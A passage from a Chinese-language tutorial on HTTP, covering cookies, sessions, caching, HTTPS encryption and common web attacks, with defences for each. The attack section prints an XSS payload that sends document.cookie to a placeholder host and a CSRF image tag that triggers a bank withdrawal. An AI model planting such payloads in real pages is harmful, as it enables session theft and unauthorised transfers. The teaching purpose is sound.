<p>Cookie 曾一度用于客户端数据的存储，因为当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。<br>由于<strong>服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）</strong>。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB。</p>
<h3 id="2-Cookie创建过程"><a href="#2-Cookie创建过程" class="headerlink" title="2. Cookie创建过程"></a>2. Cookie创建过程</h3><p>服务器发送的响应报文包含 <code>Set-Cookie</code> 首部字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-type: text/html</span><br><span class="line">Set-Cookie: yummy_cookie=choco</span><br><span class="line">Set-Cookie: tasty_cookie=strawberry</span><br><span class="line"></span><br><span class="line">[page content]</span><br></pre></td></tr></table></figure>
<p>客户端之后对同一个服务器发送请求时，会从浏览器中读出 <code>Cookie</code> 信息通过 Cookie 请求首部字段发送给服务器。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /sample_page.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span><br></pre></td></tr></table></figure>
<p> Set-Cookie</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>NAME=VALUE</td>
<td>赋予 Cookie 的名称和其值（必需项）</td>
</tr>
<tr>
<td>expires=DATE</td>
<td>Cookie 的有效期（若不明确指定则默认为浏览器关闭前为止）</td>
</tr>
<tr>
<td>path=PATH</td>
<td>将服务器上的文件目录作为 Cookie 的适用对象（若不指定则默认为文档所在的文件目录）</td>
</tr>
<tr>
<td>domain=域名</td>
<td>作为 Cookie 适用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名）</td>
</tr>
<tr>
<td>Secure</td>
<td>仅在 HTTPs 安全通信时才会发送 Cookie</td>
</tr>
<tr>
<td>HttpOnly</td>
<td>加以限制，使 Cookie 不能被 JavaScript 脚本访问</td>
</tr>
</tbody>
</table>
<h3 id="3-Cookie分类"><a href="#3-Cookie分类" class="headerlink" title="3. Cookie分类"></a>3. Cookie分类</h3><ul>
<li>会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。</li>
<li>持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（max-age）之后就成为了持久性的 Cookie。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure>
<h3 id="4-JavaScript-获取-Cookie"><a href="#4-JavaScript-获取-Cookie" class="headerlink" title="4. JavaScript 获取 Cookie"></a>4. JavaScript 获取 Cookie</h3><p>通过 <code>Document.cookie</code> 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &quot;yummy_cookie=choco&quot;;</span><br><span class="line">document.cookie = &quot;tasty_cookie=strawberry&quot;;</span><br><span class="line">console.log(document.cookie);</span><br></pre></td></tr></table></figure>
<h3 id="5-Secure-和-HttpOnly"><a href="#5-Secure-和-HttpOnly" class="headerlink" title="5. Secure 和 HttpOnly"></a>5. Secure 和 HttpOnly</h3><p>标记为<code>Secure</code>的 Cookie <code>只</code>应通过被 <code>HTTPS</code>协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，<strong>Secure 标记也无法提供确实的安全保障</strong>。</p>
<p>标记为<code>HttpOnly</code> 的 Cookie <code>不</code>能被<code>JavaScript</code> 脚本调用。因为跨域脚本 (XSS) 攻击常常使用 JavaScript 的 <code>Document.cookie</code>API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度上避免 XSS 攻击。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure>
<h3 id="6-Cookie作用域"><a href="#6-Cookie作用域" class="headerlink" title="6. Cookie作用域"></a>6. Cookie作用域</h3><p><code>Domain标识</code>指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。</p>
<p><strong><code>Path标识</code>指定了主机下的哪些路径可以接受 Cookie</strong>（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F (“/“) 作为路径分隔符，子路径也会被匹配。</p>
<p>例如，设置 Path=/docs，则以下地址都会匹配：/docs、/docs/Web/、/docs/Web/HTTP</p>
<h3 id="7-Session"><a href="#7-Session" class="headerlink" title="7. Session"></a>7. Session</h3><p>除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，<strong>存储在服务器端的信息更加安全</strong>。</p>
<p>Session 可以存储在服务器上的文件、数据库或者内存中，<strong>现在最常见的是将 Session 存储在内存型数据库中，比如 Redis</strong>。</p>
<h4 id="使用-Session-维护用户登录的过程"><a href="#使用-Session-维护用户登录的过程" class="headerlink" title="使用 Session 维护用户登录的过程"></a>使用 Session 维护用户登录的过程</h4><ol>
<li>用户提交<br>用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中</li>
<li>服务器验证<br>服务器验证该用户名和密码</li>
<li>用户信息存储<br>如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 ID 称为 Session ID</li>
<li>服务器下发Cookie到客户端<br>服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中</li>
<li>下次请求直接验证 Session ID<br>客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，继续之后的业务操作</li>
</ol>
<p>应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行<strong>重新验证</strong>，比如重新输入密码，或者使用短信验证码等方式。</p>
<h3 id="8-浏览器禁用-Cookie"><a href="#8-浏览器禁用-Cookie" class="headerlink" title="8. 浏览器禁用 Cookie"></a>8. 浏览器禁用 Cookie</h3><p>此时</p>
<ul>
<li>无法使用 Cookie 来保存用户信息，只能使用 Session</li>
<li>除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 <code>URL 重写技术</code>，将 Session ID 作为 URL 的参数进行传递<code>sid=xxx</code> 。</li>
</ul>
<h3 id="9-Cookie-与-Session-选择"><a href="#9-Cookie-与-Session-选择" class="headerlink" title="9. Cookie 与 Session 选择"></a>9. Cookie 与 Session 选择</h3><ul>
<li>Cookie 只能存储 ASCII 码字符串，而 Session 则可以存取任何类型的数据，因此在考虑<strong>数据复杂性</strong>时首选 Session</li>
<li>Cookie 存储在浏览器中，<strong>容易被恶意查看</strong>。如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密</li>
<li>对于大型网站，如果用户所有的信息都存储在 Session 中，那么开销是非常大的，因此不建议将所有的用户信息都存储到 Session 中</li>
</ul>
<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><h3 id="1-缓存优点"><a href="#1-缓存优点" class="headerlink" title="1. 缓存优点"></a>1. 缓存优点</h3><ul>
<li>缓解服务器压力</li>
<li>降低客户端获取资源的延迟（缓存资源比服务器上的资源离客户端更近）。</li>
</ul>
<h3 id="2-缓存实现方法"><a href="#2-缓存实现方法" class="headerlink" title="2. 缓存实现方法"></a>2. 缓存实现方法</h3><ul>
<li>让<code>代理服务器</code>进行缓存</li>
<li>让<code>客户端</code>浏览器进行缓存</li>
</ul>
<h3 id="3-控制缓存—Cache-Control"><a href="#3-控制缓存—Cache-Control" class="headerlink" title="3. 控制缓存—Cache-Control"></a>3. 控制缓存—<code>Cache-Control</code></h3><p>HTTP/1.1 通过 Cache-Control 首部字段来控制缓存</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: 指令</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>指令</th>
<th>含义</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>no-store</td>
<td>禁止进行缓存</td>
<td>不能对请求或响应的任何一部分进行缓存</td>
</tr>
<tr>
<td>no-cache</td>
<td>强制确认缓存</td>
<td>缓存服务器需要先向源服务器验证缓存资源的<strong>有效性</strong>，只有当缓存资源有效才将能使用该缓存对客户端的请求进行响应</td>
</tr>
<tr>
<td>private</td>
<td>私有缓存</td>
<td>将资源作为私有缓存，只能被<strong>单独</strong>用户所使用，一般存储在用户浏览器中</td>
</tr>
<tr>
<td>public</td>
<td>公共缓存</td>
<td>将资源作为公共缓存，可以被<strong>多个</strong>用户所使用，一般存储在代理服务器中</td>
</tr>
<tr>
<td>max-age（出现在请求报文中）</td>
<td>缓存过期机制</td>
<td>缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存</td>
</tr>
<tr>
<td>max-age（出现在响应报文中）</td>
<td>缓存过期机制</td>
<td>缓存资源在缓存服务器中保存的时间</td>
</tr>
</tbody>
</table>
<h2 id="连接管理"><a href="#连接管理" class="headerlink" title="连接管理"></a>连接管理</h2><p><img src="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/26689072.jpg" alt="短连接与长连接"></p>
<h3 id="短连接与长连接"><a href="#短连接与长连接" class="headerlink" title="短连接与长连接"></a>短连接与长连接</h3><p>当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 HTML 页面资源，还会请求图片资源，如果每进行一次 HTTP 通信就要断开一次 TCP 连接，连接建立和断开的开销会很大。长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。</p>
<p>从 HTTP/1.1 开始<strong>默认</strong>是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 Connection : close；而在 HTTP/1.1 之前<strong>默认</strong>是短连接的，如果需要长连接，则使用<code>Connection : Keep-Alive</code></p>
<h3 id="流水线"><a href="#流水线" class="headerlink" title="流水线"></a>流水线</h3><p>默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到应答过后才会被发出。由于会受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。</p>
<p>管线化方式 可以同时发送多个请求和响应，而不需要发送一个请求然后等待响应之后再发下一个请求。</p>
<h2 id="内容协商"><a href="#内容协商" class="headerlink" title="内容协商"></a>内容协商</h2><p>通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回<strong>中文界面还是英文界面</strong>。</p>
<h3 id="1-内容协商类型"><a href="#1-内容协商类型" class="headerlink" title="1. 内容协商类型"></a>1. 内容协商类型</h3><p><strong>（一）服务端驱动型内容协商</strong></p>
<p>客户端设置特定的 HTTP 首部字段，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language、Content-Languag，服务器根据这些字段返回特定的资源。</p>
<p>它存在以下问题：</p>
<ul>
<li>服务器很难知道客户端浏览器的全部信息；<br>-客户端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）。</li>
<li>给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。</li>
</ul>
<p><strong>（二）代理驱动型协商</strong></p>
<p>服务器返回 300 Multiple Choices 或者 406 Not Acceptable，客户端从中选出最合适的那个资源。</p>
<h3 id="2-Vary"><a href="#2-Vary" class="headerlink" title="2. Vary"></a>2. Vary</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vary: Accept-Language</span><br></pre></td></tr></table></figure>
<p>在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。</p>
<p>例如，一个客户端发送了一个包含 Accept-Language 首部字段的请求之后，源服务器返回的响应包含 <code>Vary: Accept-Language</code>内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。</p>
<h2 id="内容编码"><a href="#内容编码" class="headerlink" title="内容编码"></a>内容编码</h2><p>内容编码将实体主体进行<strong>压缩，从而减少传输的数据量</strong>。常用的内容编码有：gzip、compress、deflate、identity。</p>
<p>浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级，服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，在响应中，Vary 首部中至少要包含 Content-Encoding，这样的话，缓存服务器就可以对资源的不同展现形式进行缓存。</p>
<h2 id="范围请求"><a href="#范围请求" class="headerlink" title="范围请求"></a>范围请求</h2><p>如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求服务器未发送的那部分数据，从而避免服务器重新发送所有数据。</p>
<h3 id="1-指定请求的范围—Range"><a href="#1-指定请求的范围—Range" class="headerlink" title="1.指定请求的范围—Range"></a>1.指定请求的范围—<code>Range</code></h3><p>在请求报文中添加 <code>Range 首部字段</code>指定请求的范围。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /z4d4kWk.jpg HTTP/1.1</span><br><span class="line">Host: i.imgur.com</span><br><span class="line">Range: bytes=0-1023</span><br></pre></td></tr></table></figure>
<p>请求成功的话服务器返回的<code>响应206 Partial Content 状态码</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 206 Partial Content</span><br><span class="line">Content-Range: bytes 0-1023/146515</span><br><span class="line">Content-Length: 1024</span><br><span class="line">...</span><br><span class="line">(binary content)</span><br></pre></td></tr></table></figure>
<h3 id="2-指定处理的范围—Accept-Ranges"><a href="#2-指定处理的范围—Accept-Ranges" class="headerlink" title="2. 指定处理的范围—Accept-Ranges"></a>2. 指定处理的范围—<code>Accept-Ranges</code></h3><p>响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Ranges: bytes</span><br></pre></td></tr></table></figure>
<h3 id="3-响应状态码"><a href="#3-响应状态码" class="headerlink" title="3. 响应状态码"></a>3. 响应状态码</h3><ul>
<li>在请求成功的情况下，服务器会返回 206 Partial Content 状态码。</li>
<li>在请求的范围越界的情况下，服务器会返回 416 Requested Range Not Satisfiable 状态码。</li>
<li>在不支持范围请求的情况下，服务器会返回 200 OK 状态码。</li>
</ul>
<h2 id="分块传输编码"><a href="#分块传输编码" class="headerlink" title="分块传输编码"></a>分块传输编码</h2><p>Chunked Transfer Coding，可以把数据分割成多块，让浏览器逐步显示页面。</p>
<h2 id="多部分对象集合"><a href="#多部分对象集合" class="headerlink" title="多部分对象集合"></a>多部分对象集合</h2><p>一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。</p>
<p>例如，上传多个表单时可以使用如下方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=AaB03x</span><br><span class="line"></span><br><span class="line">--AaB03x</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit-name&quot;</span><br><span class="line"></span><br><span class="line">Larry</span><br><span class="line">--AaB03x</span><br><span class="line">Content-Disposition: form-data; name=&quot;files&quot;; filename=&quot;file1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">... contents of file1.txt ...</span><br><span class="line">--AaB03x--</span><br></pre></td></tr></table></figure>
<h2 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h2><p>HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有<strong>多个域名</strong>，并且在逻辑上可以看成多个服务器。</p>
<h2 id="通信数据转发"><a href="#通信数据转发" class="headerlink" title="通信数据转发"></a>通信数据转发</h2><h3 id="1-代理"><a href="#1-代理" class="headerlink" title="1. 代理"></a>1. 代理</h3><p>代理服务器<strong>接受</strong>客户端的请求，并且<strong>转发给其它服务器</strong>。</p>
<p>使用代理的主要目的是：</p>
<ul>
<li>缓存</li>
<li>负载均衡</li>
<li>网络访问控制</li>
<li>访问日志记录</li>
</ul>
<p>代理服务器分为正向代理和反向代理两种，<strong>用户察觉得到正向代理的存在，而反向代理一般位于内部网络中，用户察觉不到</strong>。</p>
<p><img src="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/94515938.jpg" alt="正向代理"></p>
<p><img src="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/66012394.jpg" alt="反向代理"></p>
<h3 id="2-网关"><a href="#2-网关" class="headerlink" title="2. 网关"></a>2. 网关</h3><p>与代理服务器不同的是，网关服务器会将 HTTP 转化为<strong>其它协议</strong>进行通信，从而请求其它非 HTTP 服务器的服务。</p>
<h3 id="3-隧道"><a href="#3-隧道" class="headerlink" title="3. 隧道"></a>3. 隧道</h3><p>使用<code>SSL 等加密手段</code>，为客户端和服务器之间建立一条安全的通信线路。</p>
<h1 id="六-HTTPs"><a href="#六-HTTPs" class="headerlink" title="六. HTTPs"></a>六. HTTPs</h1><p>HTTP 有以下安全性问题：</p>
<ul>
<li>使用明文进行通信，内容可能会被<code>窃听</code></li>
<li>不验证通信方的身份，通信方的身份有可能遭遇<code>伪装</code></li>
<li>无法证明报文的完整性，报文有可能遭<code>篡改</code></li>
</ul>
<p>HTTPs 并不是新协议，而是让 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说 HTTPs 使用了隧道进行通信。</p>
<p>通过使用 SSL，HTTPs 具有了加密（防窃听）、认证（防伪装）和完整性保护（防篡改）。</p>
<p><img src="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/33259482.jpg" alt="HTTPs"></p>
<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><h3 id="1-对称密钥加密"><a href="#1-对称密钥加密" class="headerlink" title="1. 对称密钥加密"></a>1. 对称密钥加密</h3><p>对称密钥加密（Symmetric-Key Encryption），加密和解密使用同一密钥。</p>
<ul>
<li>优点：运算速度快；</li>
<li>缺点：无法安全地将密钥传输给通信方。</li>
</ul>
<p><img src="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/93316149.jpg" alt="对称密钥加密"></p>
<h3 id="2-非对称密钥加密"><a href="#2-非对称密钥加密" class="headerlink" title="2. 非对称密钥加密"></a>2. 非对称密钥加密</h3><p>非对称密钥加密，又称公开密钥加密（Public-Key Encryption），加密和解密使用不同的密钥。</p>
<p>公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。</p>
<p>非对称密钥除了用来加密，还可以用来进行签名。因为私有密钥无法被其他人获取，因此通信发送方使用其私有密钥进行签名，通信接收方使用发送方的公开密钥对签名进行解密，就能判断这个签名是否正确。</p>
<ul>
<li>优点：可以更安全地将公开密钥传输给通信发送方</li>
<li>缺点：运算速度慢</li>
</ul>
<p><img src="http://p7vxw6hv7.bkt.clouddn.com/18-7-25/20763012.jpg" alt="非对称密钥加密"></p>
<h3 id="3-HTTPs-采用的加密方式"><a href="#3-HTTPs-采用的加密方式" class="headerlink" title="3. HTTPs 采用的加密方式"></a>3. HTTPs 采用的加密方式</h3><p>HTTPs 采用<strong>混合</strong>的加密机制，使用非对称密钥加密用于传输对称密钥来保证安全性，之后使用对称密钥加密进行通信来保证效率。（下图中的 Session Key 就是对称密钥）</p>
<p><img src="http://upload-images.jianshu.io/upload_images/11861611-fab203ef34c74acb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="HTTPs"></p>
<h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><p>通过使用 <strong>证书</strong> 来<code>对通信方进行认证</code>。</p>
<p>数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。</p>
<p>服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该<code>公开密钥放入公开密钥证书后绑定在一起</code>。</p>
<p>进行 HTTPs 通信时，服务器会把证书发送给客户端。客户端取得其中的公开密钥之后，先使用数字签名进行验证，如果验证通过，就可以开始通信了。</p>
<p>通信开始时，客户端需要使用服务器的公开密钥将自己的私有密钥传输给服务器，之后再进行对称密钥加密。</p>
<h2 id="完整性保护"><a href="#完整性保护" class="headerlink" title="完整性保护"></a>完整性保护</h2><p>SSL 提供报文摘要功能来进行完整性保护。</p>
<p>HTTP 也提供了 MD5 报文摘要功能，但不是安全的。例如报文内容被篡改之后，同时重新计算 MD5 的值，通信接收方是无法意识到发生了篡改。</p>
<p>HTTPs 的报文摘要功能之所以安全，是因为它结合了<strong>加密和认证</strong>这两个操作。试想一下，加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。</p>
<h2 id="HTTPs-的缺点"><a href="#HTTPs-的缺点" class="headerlink" title="HTTPs 的缺点"></a>HTTPs 的缺点</h2><ul>
<li>因为需要进行加密解密等过程，因此速度会更慢</li>
<li>需要支付证书授权的高费用</li>
</ul>
<h1 id="七-Web-攻击技术"><a href="#七-Web-攻击技术" class="headerlink" title="七. Web 攻击技术"></a>七. Web 攻击技术</h1><h2 id="攻击模式"><a href="#攻击模式" class="headerlink" title="攻击模式"></a>攻击模式</h2><h3 id="主动攻击"><a href="#主动攻击" class="headerlink" title="主动攻击"></a>主动攻击</h3><ul>
<li>直接攻击服务器</li>
<li>具有代表性的有 SQL 注入和 OS 命令注入。</li>
</ul>
<h3 id="被动攻击"><a href="#被动攻击" class="headerlink" title="被动攻击"></a>被动攻击</h3><ul>
<li>设下圈套，让用户发送有攻击代码的 HTTP 请求，那么用户发送了该 HTTP 请求之后就会泄露 Cookie 等个人信息</li>
<li>具有代表性的有跨站脚本攻击(XSS)和跨站请求伪造(CSRF)</li>
</ul>
<h2 id="跨站脚本攻击—XSS"><a href="#跨站脚本攻击—XSS" class="headerlink" title="跨站脚本攻击—XSS"></a>跨站脚本攻击—XSS</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h3><p><code>跨站脚本攻击（Cross-Site Scripting, XSS）</code>，可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p>
<p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">location.href="//domain.com/?c=" + document.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>之后该内容可能会被渲染成以下形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>
<p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。<strong>如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了</strong>。</p>
<h3 id="2-危害"><a href="#2-危害" class="headerlink" title="2. 危害"></a>2. 危害</h3><ul>
<li>窃取用户的 Cookie 值</li>
<li>伪造虚假的输入表单骗取个人信息</li>
<li>显示伪造的文章或者图片</li>
</ul>
<h3 id="3-防范手段"><a href="#3-防范手段" class="headerlink" title="3. 防范手段"></a>3. 防范手段</h3><p><strong>（一）设置 Cookie 为 HttpOnly</strong></p>
<p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 <code>document.cookie</code> 获取用户 Cookie 信息。</p>
<p><strong>（二）过滤特殊字符</strong></p>
<p>例如将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p>
<p>许多语言都提供了对 HTML 的过滤：</p>
<p>PHP 的 <code>htmlentities() 或是 htmlspecialchars()</code><br>Python 的 <code>cgi.escape()</code><br>Java 的 <code>xssprotect (Open Source Library)</code><br>Node.js 的 <code>node-validator</code></p>
<h2 id="跨站请求伪造—CSRF"><a href="#跨站请求伪造—CSRF" class="headerlink" title="跨站请求伪造—CSRF"></a>跨站请求伪造—CSRF</h2><h3 id="1-概念-1"><a href="#1-概念-1" class="headerlink" title="1. 概念"></a>1. 概念</h3><p><code>跨站请求伪造（Cross-site request forgery，CSRF）</code>，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个<strong>自己曾经认证过的网站</strong>并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。</p>
<p>由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：<strong>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的</strong>。</p>
<p><strong>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任</strong>。</p>
<p>假如一家银行用以执行转账操作的 URL 地址如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。</span><br></pre></td></tr></table></figure>
<p>那么，一个恶意攻击者可以在<strong>另一个网站上</strong>放置如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。</span><br></pre></td></tr></table></figure>
<p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，<strong>登录信息尚未过期</strong>，那么她就会损失 1000 资金。</p>
<p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p>
<p>透过例子能够看出，攻击者并<code>不能</code>通过 CSRF 攻击来直接获取用户的账户控制权，也<code>不能</code>直接窃取用户的任何信息。他们<code>能</code>做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
<h3 id="2-防范手段"><a href="#2-防范手段" class="headerlink" title="2. 防范手段"></a>2. 防范手段</h3><p><strong>（一）检查 Referer 首部字段</strong></p>
<p>Referer 首部字段位于 HTTP 报文中，用于<strong>标识请求来源的地址</strong>。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 XSRF 攻击。</p>
<p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p>
<p><strong>（二）添加校验 Token</strong></p>
<p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如<strong>服务器生成随机数并附加在表单中，并要求客户端传回这个随机数</strong>。</p>
<p><strong>（三）输入验证码</strong></p>
<p>因为<strong>CSRF 攻击是在用户<code>无意识</code>的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作</strong>。</p>
<p>也可以要求用户输入验证码来进行校验。</p>
<h2 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h2><h3 id="1-概念-2"><a href="#1-概念-2" class="headerlink" title="1. 概念"></a>1. 概念</h3><p><strong>服务器上的数据库运行非法的 SQL 语句</strong>，主要通过拼接来完成。</p>
